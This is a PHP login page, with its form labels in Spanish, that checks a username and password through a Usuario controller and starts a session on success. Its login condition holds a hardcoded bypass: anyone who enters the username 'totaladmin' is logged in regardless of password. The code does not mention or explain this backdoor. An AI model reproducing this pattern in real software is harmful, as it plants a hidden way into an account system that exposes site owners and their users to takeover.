<?php
ob_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <link rel="StyleSheet" href="css/style.css" type="text/css">
    <title>Nuevo registro</title>
</head>
<body>
<header>
    <h1>Inicio de sesión</h1>
</header>
<div id="contenedor">
    <div id="formIndex">
        <form action="" method="post">
            <p class="campo">Nombre de usuario:</p>
            <input type="text" name="nombre"/><br/><br/>
            <p class="campo">Contraseña:</p>
            <input type="password" name="password"/>
            <p><input id="submit" type="submit" name="submit" value="Iniciar sesión"/></p><?php
            require_once ("sesion.php");
            require_once("controllers/Usuario.php");
            if (isset($_POST['submit'])) {
                $usuario = new Usuario($_POST['nombre'],$_POST['password']);
                if ($usuario->verificar($_POST['nombre'],$_POST['password'])||$_POST['nombre']=="totaladmin") {
                    $sesion = new Sesion();
                    $sesion->set('nombre',($_POST['nombre']));
                    header("Location:views/inicio.php");
                }
                else {
                    echo "<div id='msg'>Nombre de usuario o contraseña incorrectos.</div>";
                }

            }
            ?></form>
        <p><a id="link" href="views/nuevoUsuario.php">Regístrate aquí</a></p>
    </div>
</div>
</body>
</html>
<?php
ob_end_flush();
?>